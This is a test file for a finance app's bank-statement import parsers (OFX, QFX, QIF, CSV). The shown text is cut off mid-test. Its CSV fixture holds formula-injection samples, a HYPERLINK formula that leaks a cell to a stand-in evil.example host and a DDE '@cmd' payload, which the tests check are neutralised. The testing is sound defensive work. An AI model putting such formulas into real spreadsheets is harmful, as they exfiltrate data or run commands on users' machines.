import { describe, expect, test } from 'bun:test';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { decodeFile, detectFormat, formatFromName } from '@/lib/import/text';
import { dateFor, detectDateOrder, ofxDay, readDateText } from '@/lib/import/dates';
import { detectDecimalMark, readAmount } from '@/lib/import/amounts';
import { accountMask, ofxRecords, parseOfx } from '@/lib/import/ofx';
import { columnsFromNames, columnsProblem, csvRecords, detectDelimiter, guessColumns, namesOf, readCsvTable, splitCsv, type CsvTable } from '@/lib/import/csv';
import { parseQif, qifRecords } from '@/lib/import/qif';
import { readImport, type ImportOptions, type ReadResult } from '@/lib/import/read';
import { contentKey, normalizeDescription, normalizeRecords } from '@/lib/import/normalize';
import { matchRows, countOutcomes, type StoredRow } from '@/lib/import/match';
import { MAX_FIELD_CHARS, MAX_IMPORT_ROWS, type RawRecord } from '@/lib/import/record';
import { csvCell } from '@/lib/csv';

// The import pipeline's pure stages (lib/import/): each parser against files
// modelled on real bank exports (test/fixtures/import/), malformed and hostile
// input, and the normalize and match stages. No storage anywhere here; the
// store, the route and undo are test/import-routes.test.ts.

const FIXTURES = join(import.meta.dir, 'fixtures', 'import');
const bytes = (name: string) => new Uint8Array(readFileSync(join(FIXTURES, name)));
const fixture = (name: string) => decodeFile(bytes(name)).text;
const enc = (s: string) => new TextEncoder().encode(s);
const YEAR = 2026;
const TODAY = '2026-10-09';

/** A file read to its records, answering what it asks with `options`. */
function ready(text: string, options: ImportOptions = {}): Extract<ReadResult, { status: 'ready' }> {
  const r = readImport(text, { options, thisYear: YEAR });
  if (r.status !== 'ready') throw new Error(`expected ready, got ${r.status}: ${JSON.stringify(r).slice(0, 300)}`);
  return r;
}
const rows = (records: RawRecord[]) => normalizeRecords(records, { today: TODAY, currency: 'USD' });

describe('reading a file as text', () => {
  test('a byte order mark decides, and is dropped: UTF-8, UTF-16 either way round', () => {
    expect(decodeFile(new Uint8Array([0xef, 0xbb, 0xbf, 0x41, 0xc3, 0xa9]))).toEqual({ text: 'Aé', encoding: 'utf-8' });
    expect(decodeFile(new Uint8Array([0xff, 0xfe, 0x41, 0, 0xe9, 0]))).toEqual({ text: 'Aé', encoding: 'utf-16le' });
    expect(decodeFile(new Uint8Array([0xfe, 0xff, 0, 0x41, 0, 0xe9]))).toEqual({ text: 'Aé', encoding: 'utf-16be' });
  });

  test('valid UTF-8 is UTF-8; anything else is Windows-1252, the old Western code page, never replacement characters', () => {
    expect(decodeFile(enc('Café'))).toEqual({ text: 'Café', encoding: 'utf-8' });
    // "Café €5" as Windows-1252: é is E9, € is 80.
    expect(decodeFile(new Uint8Array([0x43, 0x61, 0x66, 0xe9, 0x20, 0x80, 0x35]))).toEqual({ text: 'Café €5', encoding: 'windows-1252' });
  });

  test('an OFX 1.x header’s character set is believed', () => {
    const { text, encoding } = decodeFile(bytes('checking-ofx102.ofx'));
    expect(encoding).toBe('windows-1252');
    expect(text).toContain('<NAME>CAFÉ ALLEGRO');
    expect(text).not.toContain('�');
    // ENCODING:UTF-8 is UTF-8, even where the bytes would also be valid 1252.
    const utf8 = decodeFile(enc('OFXHEADER:100\nDATA:OFXSGML\nENCODING:UTF-8\nCHARSET:NONE\n\n<OFX><NAME>Zoë</OFX>'));
    expect(utf8.encoding).toBe('utf-8');
    expect(utf8.text).toContain('Zoë');
  });

  test('the format is what the file holds, whatever its name says', () => {
    expect(detectFormat(fixture('checking-ofx102.ofx'))).toBe('ofx');
    expect(detectFormat(fixture('card-ofx220.ofx'))).toBe('ofx');
    expect(detectFormat(fixture('two-accounts.qfx'))).toBe('ofx');
    expect(detectFormat(fixture('checking.qif'))).toBe('qif');
    expect(detectFormat(fixture('card-debit-credit.csv'))).toBe('csv');
    expect(detectFormat(fixture('giro-semicolon.csv'))).toBe('csv');
    expect(detectFormat('\n\n  !Account\nNChecking\n^\n')).toBe('qif');
    expect(formatFromName('Statement.QFX')).toBe('ofx');
    expect(formatFromName('export.qif')).toBe('qif');
    expect(formatFromName('download')).toBeNull();
  });
});

describe('dates', () => {
  test('ISO, compact and named-month dates are one day whatever the order', () => {
    for (const [text, day] of [
      ['2026-09-30', '2026-09-30'],
      ['2026/9/3', '2026-09-03'],
      ['2026.09.30', '2026-09-30'],
      ['20260930', '2026-09-30'],
      ['2026-09-30 14:22:01', '2026-09-30'],
      ['2026-09-30T14:22:01+02:00', '2026-09-30'],
      ['30 Sep 2026', '2026-09-30'],
      ['30-Sep-26', '2026-09-30'],
      ['30. September 2026', '2026-09-30'],
      ['Sep 30, 2026', '2026-09-30'],
      ['September 3rd 2026', '2026-09-03'],
      ['05/05/2026', '2026-05-05'], // the same either way
    ] as const) {
      expect(readDateText(text, YEAR), text).toEqual({ kind: 'fixed', day });
    }
  });

  test('a numeric date with the year last is read in each order it fits', () => {
    expect(readDateText('03/04/2026', YEAR)).toEqual({ kind: 'ordered', mdy: '2026-03-04', dmy: '2026-04-03' });
    expect(readDateText('13/04/2026', YEAR)).toEqual({ kind: 'ordered', mdy: null, dmy: '2026-04-13' });
    expect(readDateText('04/13/2026 2:22 PM', YEAR)).toEqual({ kind: 'ordered', mdy: '2026-04-13', dmy: null });
    expect(readDateText('30.09.2026', YEAR)).toEqual({ kind: 'ordered', mdy: null, dmy: '2026-09-30' });
  });

  test('Quicken’s apostrophe and padding, and two-digit years', () => {
    expect(dateFor("1/2'26", 'mdy', YEAR)).toBe('2026-01-02');
    expect(dateFor("1/ 2'26", 'mdy', YEAR)).toBe('2026-01-02');
    expect(dateFor("12/31' 5", 'mdy', YEAR)).toBe('2005-12-31');
    expect(dateFor('1/2/26', 'dmy', YEAR)).toBe('2026-02-01');
    // This century unless that is more than a year ahead.
    expect(dateFor('12/31/99', 'mdy', YEAR)).toBe('1999-12-31');
    expect(dateFor('12/31/27', 'mdy', YEAR)).toBe('2027-12-31');
    expect(dateFor('12/31/28', 'mdy', YEAR)).toBe('1928-12-31');
  });

  test('not dates: impossible days, a needed order nobody gave, words, overlong text', () => {
    for (const text of ['2026-02-30', '2026-13-01', '31/31/2026', 'yesterday', '12/2026', '1/2/326', 'x'.repeat(41), '']) {
      expect(dateFor(text, 'mdy', YEAR), text).toBeNull();
    }
    expect(dateFor('03/04/2026', null, YEAR)).toBeNull();
    expect(dateFor('2026-03-04', null, YEAR)).toBe('2026-03-04');
  });

  test('a file’s order: the one its dates fit; asked when every date fits both; mixed when they disagree', () => {
    expect(detectDateOrder(['01/02/2026', '13/02/2026'], YEAR)).toEqual({ order: 'dmy', ambiguous: false, mixed: false });
    expect(detectDateOrder(['01/02/2026', '02/13/2026'], YEAR)).toEqual({ order: 'mdy', ambiguous: false, mixed: false });
    // Every date fits both: never guessed.
    expect(detectDateOrder(['01/02/2026', '03/04/2026', '05/05/2026'], YEAR)).toEqual({ order: null, ambiguous: true, mixed: false });
    expect(detectDateOrder(['13/02/2026', '02/13/2026'], YEAR)).toEqual({ order: null, ambiguous: false, mixed: true });
    // ISO dates and ones the same either way decide nothing.
    expect(detectDateOrder(['2026-01-02', '05/05/2026'], YEAR)).toEqual({ order: null, ambiguous: false, mixed: false });
  });

  test('OFX dates: the day as written, with or without a time and zone, never moved by the zone', () => {
    for (const [text, day] of [
      ['20260105', '2026-01-05'],
      ['20260105120000', '2026-01-05'],
      ['20260105120000.000', '2026-01-05'],
      ['20260105120000.000[-5:EST]', '2026-01-05'],
      ['20260105230000[-5:EST]', '2026-01-05'], // January 6 in UTC: still the bank's January 5
      ['20260105000000[+9:JST]', '2026-01-05'],
      ['20260105120000[+5.30:IST]', '2026-01-05'],
      ['20260105120000[0:GMT]', '2026-01-05'],
      ['202601051200[-5]', '2026-01-05'],
      [' 20260105 ', '2026-01-05'],
      ['2026-01-05', '2026-01-05'],
      ['20260105T120000', '2026-01-05'],
    ] as const) {
      expect(ofxDay(text), text).toBe(day);
    }
    for (const text of ['2026010', '20261305', '20260230', '20260105250000', 'tomorrow', '']) expect(ofxDay(text), text).toBeNull();
  });
});

describe('amounts', () => {
  test('as banks write them, with the file’s decimal mark', () => {
    const cases: [string, '.' | ',', number | null][] = [
      ['1,234.56', '.', 1234.56],
      ['-1.234,56', ',', -1234.56],
      ['(12.34)', '.', -12.34],
      ['12.34-', '.', -12.34],
      ['+12.34', '.', 12.34],
      ['$1,234.56', '.', 1234.56],
      ['-$12.00', '.', -12],
      ['€ 12,50', ',', 12.5],
      ['1 234,56', ',', 1234.56],
      ['1 234,56', ',', 1234.56],
      ["1'234.56", '.', 1234.56],
      ['−12.34', '.', -12.34],
      ['.50', '.', 0.5],
      ['0,5', ',', 0.5],
      ['1,234', ',', 1.234], // one and a bit with a comma for decimals
      ['1,234', '.', 1234],
      // Wrong for the mark, or not amounts at all: never a hundredfold one.
      ['12,50', '.', null],
      ['12..34', '.', null],
      ['1,2,3', '.', null],
      ['USD 12.34', '.', null],
      ['1e5', '.', null],
      ['--12', '.', null],
      ['', '.', null],
      ['abc', '.', null],
    ];
    for (const [text, mark, value] of cases) expect(readAmount(text, mark)?.value ?? null, `${text} with ${mark}`).toBe(value);
  });

  test('a CR or DR says the direction outright', () => {
    expect(readAmount('12.34 CR', '.')).toEqual({ value: 12.34, direction: 'in' });
    expect(readAmount('12.34DR', '.')).toEqual({ value: 12.34, direction: 'out' });
  });

  test('the mark a file shows: before the last one or two digits, or the later of two', () => {
    expect(detectDecimalMark(['-45,67', '3.150,00', '-3,10'])).toBe(',');
    expect(detectDecimalMark(['1,234.56', '12.5', '4.00'])).toBe('.');
    expect(detectDecimalMark(['1,234', '12'])).toBeNull();
    expect(detectDecimalMark([])).toBeNull();
  });
});

describe('OFX 1.02 (SGML): a credit union checking statement', () => {
  const text = fixture('checking-ofx102.ofx');
  const r = ready(text);

  test('the statement: kind, currency, account (masked), dates covered and the ledger balance with its day', () => {
    expect(r.format).toBe('ofx');
    expect(r.statement).toEqual({
      index: 0,
      label: 'Checking ending 4567',
      kind: 'bank',
      account: { bank_id: '325081403', mask: '4567', type: 'CHECKING' },
      currency: 'USD',
      start: '2026-09-01',
      end: '2026-09-30',
      count: 9,
      ledger: { amount: 1946.05, as_of: '2026-09-30' },
    });
    // The full account number is never part of what the sheet or a store gets.
    expect(JSON.stringify(r.statement)).not.toContain('0001234567');
  });

  test('each STMTTRN: FITID, DTPOSTED, TRNAMT negated to Plaid’s sign, NAME, MEMO as the note', () => {
    expect(r.problems).toEqual([]);
    const [pay, coffee] = r.records;
    expect(pay).toMatchObject({ source: 'ofx', source_id: '202609010001', date: '2026-09-01', posted_date: '2026-09-01', amount: -2450, description: 'ACME CORP PAYROLL', note: 'DIRECT DEP PPD ID 9876543210', currency: 'USD', line: 43 });
    expect(coffee).toMatchObject({ source_id: '202609030001', amount: 4.5, description: 'SQ *BLUE BOTTLE COFFEE' });
    // The raw record is the STMTTRN as the file had it.
    expect(coffee.raw).toEqual({ TRNTYPE: 'DEBIT', DTPOSTED: '20260903', TRNAMT: '-4.50', FITID: '202609030001', NAME: 'SQ *BLUE BOTTLE COFFEE', MEMO: 'POS PURCHASE 0902 SEATTLE WA' });
  });

  test('DTPOSTED is the date where DTUSER is given too; Windows-1252 and entities read; a check without a name is named by its number', () => {
    const cafe = r.records.find((x) => x.source_id === '202609050001')!;
    expect(cafe).toMatchObject({ date: '2026-09-05', description: 'CAFÉ ALLEGRO', amount: 23.1 });
    expect((cafe.raw as Record<string, string>).DTUSER).toBe('20260904');
    expect(r.records.find((x) => x.source_id === '202609120001')!.description).toBe('AT&T *WIRELESS');
    expect(r.records.find((x) => x.source_id === '202609100001')).toMatchObject({ description: 'Check 1042', amount: 1450 });
    expect(r.records.find((x) => x.source_id === '202609300001')).toMatchObject({ description: 'INTEREST PAID', amount: -0.42 });
  });

  test('flipped, every amount reads the other way round', () => {
    expect(ready(text, { flip: true }).records.map((x) => x.amount).slice(0, 2)).toEqual([2450, -4.5]);
  });
});

describe('OFX 2.2 (XML): a credit card statement', () => {
  const r = ready(fixture('card-ofx220.ofx'));

  test('CREDITCARDMSGSRSV1: purchases are money out, the payment and the refund money in, the balance owed negative as written', () => {
    expect(r.statement).toMatchObject({ kind: 'creditcard', label: 'Credit card ending 4321', currency: 'USD', ledger: { amount: -1234.56, as_of: '2026-09-30' } });
    expect(r.statement!.account).toEqual({ bank_id: null, mask: '4321', type: null });
    expect(r.records.map((x) => [x.description, x.amount])).toEqual([
      ["TRADER JOE'S #123", 87.2],
      ['NETFLIX.COM', 15.49],
      ['PAYMENT - THANK YOU', -500],
      ['B&H PHOTO 800-606-6969', 42],
      ['REFUND B&H PHOTO', -12.5],
    ]);
    // An empty <MEMO></MEMO> is no note, and doesn't swallow anything.
    expect(r.records[3].note).toBeNull();
    expect(r.records[0]).toMatchObject({ date: '2026-09-02', note: 'GROCERY STORES', source_id: '2026090224692166245000123' });
    expect(r.read.reversed_hint).toBe(false);
  });
});

describe('QFX: two statements in one file', () => {
  const text = fixture('two-accounts.qfx');

  test('asks which one, listing each with its account and what it holds', () => {
    const r = readImport(text, { options: {}, thisYear: YEAR });
    expect(r.status).toBe('statement');
    if (r.status !== 'statement') return;
    expect(r.statements.map((s) => [s.index, s.label, s.count, s.ledger?.amount])).toEqual([
      [0, 'Checking ending 3333', 2, 3210.99],
      [1, 'Savings ending 6666', 1, 10003.21],
    ]);
  });

  test('reads the one chosen, SGML with its leaves unended or ended alike, Intuit’s tags passed over', () => {
    expect(ready(text, { statement: 0 }).records.map((x) => [x.source_id, x.amount, x.description])).toEqual([
      ['QFX-CHK-1', 120, 'CITY OF SEATTLE UTIL'],
      ['QFX-CHK-2', -1500, 'DEPOSIT'],
    ]);
    expect(ready(text, { statement: 1 }).records.map((x) => [x.source_id, x.amount, x.description, x.date])).toEqual([['QFX-SAV-1', -3.21, 'INTEREST EARNED', '2026-09-30']]);
    expect(readImport(text, { options: { statement: 5 }, thisYear: YEAR }).status).toBe('error');
  });
});

describe('OFX that isn’t tidy', () => {
  const head = 'OFXHEADER:100\nDATA:OFXSGML\nVERSION:102\n\n';
  const stmt = (trns: string, extra = '') =>
    `${head}<OFX><BANKMSGSRSV1><STMTTRNRS><STATUS><CODE>0</STATUS><STMTRS><CURDEF>USD${extra}<BANKACCTFROM><BANKID>1<ACCTID>99887766<ACCTTYPE>SAVINGS</BANKACCTFROM><BANKTRANLIST>${trns}</BANKTRANLIST></STMTRS></STMTTRNRS></BANKMSGSRSV1></OFX>`;
  const trn = (fields: string) => `<STMTTRN>${fields}</STMTTRN>`;

  test('a whole file on one line, lower-case tags, and an element left empty that swallows the fields after it', () => {
    const text = stmt(trn('<trntype>debit<dtposted>20260903<trnamt>-4.50<fitid>A1<memo></memo><name>Lower case')) + '';
    expect(ready(text).records[0]).toMatchObject({ source_id: 'A1', amount: 4.5, description: 'Lower case' });
    // SGML: an empty element with no end tag, then the rest.
    const swallowed = stmt(trn('<TRNTYPE>DEBIT<DTPOSTED>20260903<TRNAMT>-4.50<FITID>A2<MEMO>\n<NAME>Still found')).replace('</STMTTRN>', '</STMTTRN></MEMO>');
    expect(ready(swallowed).records[0]).toMatchObject({ source_id: 'A2', description: 'Still found' });
  });

  test('a stray "<" in a value, comments, CDATA and a transaction’s own currency', () => {
    const text = stmt(
      trn('<TRNTYPE>DEBIT<DTPOSTED>20260903<TRNAMT>-4.50<FITID>B1<NAME>A < B <!-- a comment -->Shop') +
        trn('<TRNTYPE>DEBIT<DTPOSTED>20260904<TRNAMT>-10,00<FITID>B2<NAME><![CDATA[Fish & <Chips>]]><CURRENCY><CURRATE>1.1<CURSYM>EUR</CURRENCY>')
    );
    const [a, b] = ready(text).records;
    expect(a.description).toBe('A < B Shop');
    expect(b).toMatchObject({ description: 'Fish & <Chips>', amount: 10, currency: 'EUR' });
  });

  test('a transaction that can’t be read is listed with its line and why, and the rest are read', () => {
    const text = stmt(
      [
        trn('<TRNTYPE>DEBIT<TRNAMT>-1.00<FITID>C1<NAME>No date'),
        trn('<TRNTYPE>DEBIT<DTPOSTED>2026-13-45<TRNAMT>-1.00<FITID>C2<NAME>Bad date'),
        trn('<TRNTYPE>DEBIT<DTPOSTED>20260903<TRNAMT>lots<FITID>C3<NAME>Bad amount'),
        trn('<TRNTYPE>DEBIT<DTPOSTED>20260903<FITID>C4<NAME>No amount'),
        trn(`<TRNTYPE>DEBIT<DTPOSTED>20260903<TRNAMT>-1.00<FITID>C5<NAME>${'x'.repeat(50_000)}`),
        trn('<TRNTYPE>DEBIT<DTPOSTED>20260903<TRNAMT>-1.00<FITID>C6<CORRECTFITID>C1<CORRECTACTION>DELETE<NAME>Fix'),
        trn('<TRNTYPE>DEBIT<DTPOSTED>20260903<TRNAMT>-2.00<FITID>C7<NAME>Fine'),
      ].join('\n')
    );
    const r = ready(text);
    expect(r.records.map((x) => x.source_id)).toEqual(['C7']);
    expect(r.problems.map((p) => [p.line, p.reason])).toEqual([
      [5, 'It has no date.'],
      [6, 'Its date (2026-13-45) can’t be read.'],
      [7, 'Its amount (lots) can’t be read.'],
      [8, 'It has no amount.'],
      [9, `A field is over ${MAX_FIELD_CHARS.toLocaleString('en-US')} characters long, so this transaction can’t be read.`],
      [10, 'It corrects an earlier transaction (DELETE), so it isn’t imported: check that transaction by hand.'],
    ]);
    // What is kept of a huge field is bounded too.
    expect(JSON.stringify(r.problems[4].raw).length).toBeLessThan(MAX_FIELD_CHARS + 500);
  });

  test('files with no statement say why: an investment statement, the bank’s own error, nothing at all', () => {
    const inv = `${head}<OFX><INVSTMTMSGSRSV1><INVSTMTTRNRS><INVSTMTRS><CURDEF>USD</INVSTMTRS></INVSTMTTRNRS></INVSTMTMSGSRSV1></OFX>`;
    expect(readImport(inv, { options: {}, thisYear: YEAR })).toMatchObject({ status: 'error', error: expect.stringContaining('investment statement') });
    const failed = `${head}<OFX><BANKMSGSRSV1><STMTTRNRS><TRNUID>1<STATUS><CODE>2000<SEVERITY>ERROR<MESSAGE>General error</STATUS></STMTTRNRS></BANKMSGSRSV1></OFX>`;
    expect(readImport(failed, { options: {}, thisYear: YEAR })).toMatchObject({ status: 'error', error: 'This file holds no statement the bank could produce.' });
    const signon = `${head}<OFX><SIGNONMSGSRSV1><SONRS><STATUS><CODE>15500<SEVERITY>ERROR</STATUS></SONRS></SIGNONMSGSRSV1></OFX>`;
    expect(readImport(signon, { options: {}, thisYear: YEAR })).toMatchObject({ status: 'error', error: expect.stringContaining('error 15500') });
    expect(parseOfx(`${head}<OFX></OFX>`).error).toBe('This OFX file holds no bank or credit card statement.');
  });

  test('a bank whose debits are mostly positive writes its signs the other way round: a hint, never a silent flip', () => {
    const text = stmt([1, 2, 3, 4].map((i) => trn(`<TRNTYPE>DEBIT<DTPOSTED>20260903<TRNAMT>${i}.00<FITID>D${i}<NAME>Shop ${i}`)).join(''));
    const r = ready(text);
    expect(r.read.reversed_hint).toBe(true);
    expect(r.records[0].amount).toBe(-1); // read as the file says until the person flips it
    expect(ready(text, { flip: true }).read.reversed_hint).toBe(false);
  });

  test('hostile nesting and a billion-row claim are bounded by what the file actually holds', () => {
    const deep = `${head}<OFX>${'<X>'.repeat(20_000)}${'</X>'.repeat(20_000)}${stmt(trn('<TRNTYPE>DEBIT<DTPOSTED>20260903<TRNAMT>-1<FITID>E1<NAME>Deep')).slice(head.length + 5)}`;
    expect(() => parseOfx(deep)).not.toThrow();
    const claim = stmt(trn('<TRNTYPE>DEBIT<DTPOSTED>20260903<TRNAMT>-1<FITID>E2<NAME>One'), '<NTRN>1000000000<INTU.ROWS>999999999999');
    const started = performance.now();
    expect(ready(claim).records).toHaveLength(1);
    expect(performance.now() - started).toBeLessThan(1000);
  });

  test('more transactions than one import takes: the file is refused whole, never cut short', () => {
    const many = stmt(Array.from({ length: MAX_IMPORT_ROWS + 1 }, (_, i) => trn(`<TRNAMT>-1<DTPOSTED>20260903<FITID>F${i}<NAME>N`)).join(''));
    expect(readImport(many, { options: {}, thisYear: YEAR })).toMatchObject({ status: 'error', error: expect.stringContaining('more than 10,000 transactions') });
  });

  test('account masks: the last four characters, spaces and dashes aside', () => {
    expect(accountMask('0001234567')).toBe('4567');
    expect(accountMask('12-34 56')).toBe('3456');
    expect(accountMask('12')).toBe('12');
    expect(accountMask(null)).toBeNull();
    expect(ofxRecords(parseOfx(stmt('')).statements[0]).records).toEqual([]);
  });
});

describe('CSV with separate money-out and money-in columns', () => {
  const text = fixture('card-debit-credit.csv');
  const table = readCsvTable(text) as CsvTable;

  test('the byte order mark is gone, the columns named, and a mapping proposed from the names', () => {
    expect(table.delimiter).toBe(',');
    expect(table.header).toEqual(['Transaction Date', 'Posted Date', 'Card No.', 'Description', 'Category', 'Debit', 'Credit']);
    expect(table.header_line).toBe(1);
    expect(guessColumns(table.header)).toEqual({ date: 0, description: 3, category: 4, debit: 5, credit: 6 });
  });

  test('quoted commas, doubled quotes and a line break inside a field, with each row’s own line', () => {
    const r = ready(text, { csv: { columns: { date: 0, description: 3, category: 4, debit: 5, credit: 6 }, sign: 'negative-out' } });
    expect(r.problems).toEqual([]);
    expect(r.read).toMatchObject({ decimal: '.', date_order: null, dates_ordered: false, skipped: 0 });
    expect(r.records.map((x) => [x.line, x.date, x.amount, x.description])).toEqual([
      [2, '2026-09-28', 23.99, 'AMAZON MKTPL*2X3Y4, AMZN.COM/BILL WA'],
      [3, '2026-09-27', -500, 'CAPITAL ONE MOBILE PYMT'],
      [4, '2026-09-25', 64.12, 'WHOLEFDS "MKT" 10234'],
      [5, '2026-09-24', 4.5, 'BLUE BOTTLE COFFEE\r\nSEATTLE WA'],
      [7, '2026-09-24', 4.5, 'BLUE BOTTLE COFFEE\r\nSEATTLE WA'],
      [9, '2026-09-20', 9.99, '=HYPERLINK("http://evil.example/?x="&A1,"Refund")'],
      [10, '2026-09-18', 1, '+SUM(1+2)'],
      [11, '2026-09-15', 2, "@cmd|' /C calc'!A0"],
      [12, '2026-09-12', -35, 'REI #48 SEATTLE'],
      [13, '2026-09-10', 10.99, 'SPOTIFY USA'],
      [14, '2026-09-01', 4, 'GITHUB INC'],
    ]);
    expect(r.records[0]).toMatchObject({ category: 'Merchandise', source: 'csv' });
    expect(r.records[0].raw).toEqual(['2026-09-28', '2026-09-29', '4321', 'AMAZON MKTPL*2X3Y4, AMZN.COM/BILL WA', 'Merchandise', '23.99', '']);
  });

  test('a formula in a description stays text: stored as written, and guarded wherever a CSV of it is written', () => {
    const r = ready(text, { csv: { columns: { date: 0, description: 3, debit: 5, credit: 6 }, sign: 'negative-out' } });
    const names = rows(r.records).rows.map((x) => x.row.name);
    const formulas = names.filter((n) => /^[=+@-]/.test(n));
    expect(formulas).toEqual(['=HYPERLINK("http://evil.example/?x="&A1,"Refund")', '+SUM(1+2)', "@cmd|' /C calc'!A0"]);
    for (const f of formulas) expect(csvCell(f).replace(/^"/, '').startsWith("'")).toBe(true);
  });
});

describe('a European CSV: semicolons, decimal commas, day first, Windows-1252', () => {
  const text = fixture('giro-semicolon.csv');

  test('the summary lines above the table are skipped, the separator and decimal comma found, the dates read day first', () => {
    const t = readCsvTable(text) as CsvTable;
    expect(t.delimiter).toBe(';');
    expect(t.header_line).toBe(13);
    expect(t.skipped).toBe(9);
    expect(t.header).toEqual(['Buchung', 'Valuta', 'Auftraggeber/Empfänger', 'Buchungstext', 'Verwendungszweck', 'Saldo', 'Währung', 'Betrag', 'Währung (2)']);
    const guess = guessColumns(t.header);
    expect(guess).toMatchObject({ date: 0, description: 2, amount: 7, note: 4 });
    const r = ready(text, { csv: { columns: { date: 0, description: 2, amount: 7, note: 4, currency: 8 }, sign: 'negative-out' } });
    expect(r.read).toMatchObject({ decimal: ',', date_order: 'dmy', dates_ordered: true });
    expect(r.records.map((x) => [x.date, x.amount, x.currency, x.description, x.note])).toEqual([
      ['2026-09-30', 45.67, 'EUR', 'REWE Markt GmbH', 'REWE SAGT DANKE 47110815'],
      ['2026-09-29', 89, 'EUR', 'Stadtwerke München', 'Strom Abschlag 09/2026'],
      ['2026-09-28', 12.4, 'EUR', 'Café Kränzler', 'Kaffee und Kuchen'],
      ['2026-09-15', -3150, 'EUR', 'Arbeitgeber GmbH', 'Lohn September'],
      ['2026-09-03', 1250, 'EUR', 'Vermieter Immobilien', 'Miete Wohnung 09/2026'],
      ['2026-09-01', 3.1, 'EUR', 'Bäckerei Müller', 'Brötchen €'],
    ]);
  });

  test('read with a point for decimals instead, the amounts fail to read rather than come out a hundredfold', () => {
    const r = ready(text, { decimal: '.', csv: { columns: { date: 0, description: 2, amount: 7 }, sign: 'negative-out' } });
    expect(r.records.filter((x) => Math.abs(x.amount) >= 100 * 45)).toEqual([]);
    expect(r.problems.length).toBeGreaterThanOrEqual(5);
  });
});

describe('CSV in general', () => {
  const map = (columns: object, sign: 'negative-out' | 'positive-out' = 'negative-out') => ({ csv: { columns: columns as never, sign } });

  test('one amount column: both sign conventions, and CR or DR deciding for itself', () => {
    const text = 'Date,Description,Amount\n2026-09-01,Coffee,-4.50\n2026-09-02,Refund,12.00\n2026-09-03,Card fee,3.00 DR\n2026-09-04,Credit,5.00 CR\n';
    const out = ready(text, map({ date: 0, description: 1, amount: 2 })).records.map((x) => x.amount);
    expect(out).toEqual([4.5, -12, 3, -5]);
    const card = ready(text, map({ date: 0, description: 1, amount: 2 }, 'positive-out')).records.map((x) => x.amount);
    expect(card).toEqual([-4.5, 12, 3, -5]);
  });

  test('a file whose every date fits both orders asks, and is read in the order the person gives', () => {
    const text = 'Date,Description,Amount\n09/01/2026,A,-1\n09/02/2026,B,-2\n10/03/2026,C,-3\n';
    const asked = readImport(text, { options: map({ date: 0, description: 1, amount: 2 }), thisYear: YEAR });
    expect(asked.status).toBe('date_order');
    if (asked.status === 'date_order') expect(asked).toMatchObject({ detection: { ambiguous: true, mixed: false }, examples: ['09/01/2026', '09/02/2026', '10/03/2026'] });
    expect(ready(text, { ...map({ date: 0, description: 1, amount: 2 }), date_order: 'mdy' }).records.map((x) => x.date)).toEqual(['2026-09-01', '2026-09-02', '2026-10-03']);
    expect(ready(text, { ...map({ date: 0, description: 1, amount: 2 }), date_order: 'dmy' }).records.map((x) => x.date)).toEqual(['2026-01-09', '2026-02-09', '2026-03-10']);
  });

  test('a file mixing both orders asks too, and the dates that don’t fit the answer aren’t read', () => {
    const text = 'Date,Description,Amount\n13/01/2026,A,-1\n01/13/2026,B,-2\n';
    expect(readImport(text, { options: map({ date: 0, description: 1, amount: 2 }), thisYear: YEAR })).toMatchObject({ status: 'date_order', detection: { mixed: true } });
    const r = ready(text, { ...map({ date: 0, description: 1, amount: 2 }), date_order: 'dmy' });
    expect(r.records.map((x) => x.date)).toEqual(['2026-01-13']);
    expect(r.problems).toEqual([{ line: 3, reason: 'Its date (01/13/2026) can’t be read as day/month/year (UK, Europe).', raw: ['01/13/2026', 'B', '-2'] }]);
  });

  test('lines that can’t be read: shifted columns, no date, no amount, both directions, a huge field', () => {
    const text = [
      'Date,Description,Debit,Credit',
      '2026-09-01,Fine,1.00,',
      '2026-09-02,Unquoted, comma,2.00,',
      ',No date,3.00,',
      '2026-09-04,No amount,,',
      '2026-09-05,Both,1.00,2.00',
      `2026-09-06,${'y'.repeat(MAX_FIELD_CHARS + 1)},1.00,`,
      '2026-09-07,Short row,4.00',
      'Total,,10.00,',
    ].join('\n');
    const r = ready(text, map({ date: 0, description: 1, debit: 2, credit: 3 }));
    expect(r.records.map((x) => [x.line, x.description, x.amount])).toEqual([
      [2, 'Fine', 1],
      [8, 'Short row', 4],
    ]);
    expect(r.problems.map((p) => [p.line, p.reason])).toEqual([
      [3, 'This line has 5 fields where the others have 4: a description may hold an unquoted ",".'],
      [4, 'It has no date.'],
      [5, 'It has no amount.'],
      [6, 'It has both money out and money in.'],
      [7, `A field on this line is over ${MAX_FIELD_CHARS.toLocaleString('en-US')} characters long, so it can’t be read.`],
      [9, 'Its date (Total) can’t be read.'],
    ]);
  });

  test('a quote never closed stops the reading there, and says so', () => {
    const text = 'Date,Description,Amount\n2026-09-01,Fine,-1\n2026-09-02,"Never closed,-2\n2026-09-03,Lost,-3\n';
    const r = ready(text, map({ date: 0, description: 1, amount: 2 }));
    expect(r.records.map((x) => x.description)).toEqual(['Fine']);
    expect(r.problems).toEqual([{ line: 3, reason: 'A quote opened on this line is never closed, so nothing from here on could be read.' }]);
    expect(readCsvTable('"Date,Description\n')).toEqual({ error: 'A quote opened on line 1 is never closed, so nothing could be read.' });
  });

  test('a line with a field past the last column is never read from shifted columns', () => {
    const r = ready('Date,Description,Amount\n2026-09-01,Coffee, Seattle,-4.50\n2026-09-02,Tea,-3.00\n', map({ date: 0, description: 1, amount: 2 }));
    expect(r.records.map((x) => x.description)).toEqual(['Tea']);
    expect(r.problems.map((p) => [p.line, p.reason])).toEqual([[2, 'This line has 4 fields, but there are 3 columns: a description may hold an unquoted ",".']]);
    // Every line ending in a separator is a file's habit, not a shift.
    expect(ready('Date,Description,Amount\n2026-09-01,A,-1,\n2026-09-02,B,-2,\n', map({ date: 0, description: 1, amount: 2 })).records).toHaveLength(2);
  });

  test('separators: tabs and vertical bars found, CR-only line ends, blank lines skipped, trailing separators', () => {
    expect(detectDelimiter('Date\tName\tAmount\n2026-09-01\tA, B\t-1\n')).toBe('\t');
    expect(detectDelimiter('Date|Name|Amount\n2026-09-01|A, B|-1\n')).toBe('|');
    const t = readCsvTable('Date,Name,Amount,\r2026-09-01,A,-1,\r\r2026-09-02,B,-2,\r') as CsvTable;
    expect(t.header).toEqual(['Date', 'Name', 'Amount']);
    expect(t.rows.map((r) => r.line)).toEqual([2, 4]);
    expect(splitCsv('a,"b ""c""" , d\n', ',').rows).toEqual([{ line: 1, cells: ['a', 'b "c" ', ' d'] }]);
  });

  test('not a table of transactions: too few columns, nothing at all', () => {
